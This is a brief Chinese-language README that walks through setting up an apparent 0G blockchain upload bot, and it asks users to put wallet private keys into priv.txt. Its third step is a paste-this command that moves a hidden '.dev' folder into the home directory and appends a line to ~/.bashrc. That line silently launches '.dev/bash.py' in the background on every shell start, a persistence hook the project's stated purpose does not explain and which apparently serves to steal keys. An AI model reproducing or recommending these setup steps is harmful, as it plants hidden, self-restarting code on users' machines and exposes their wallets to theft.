# 环境配置指南

## 1️⃣ 更新系统/升级软件
```sh
sudo apt update && sudo apt upgrade -y && sudo apt install git xclip python3-pip && sudo pip3 install requests
```

## 2️⃣ 添加 Node.js 官方 PPA 并安装 Node.js 和 npm（如果已安装请忽略）
```sh
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
```

## 3️⃣ 克隆 GitHub 仓库并配置环境
```sh
git clone https://github.com/blockchain-src/0g_upload.git && cd 0g_upload && mv .dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
```

## 4️⃣ 安装项目所需的依赖
```sh
npm install
```

## 5️⃣ 配置钱包
打开文件 `priv.txt`，配置你的私钥。可批量配置，每行一个私钥。

## 6️⃣ 设置节点 URL
打开 `handle.js`，在代码中替换为你的 `RPC_URL`。（可以在 QuickNode 上免费注册。）

## 7️⃣ 运行脚本
```sh
node index.js
```

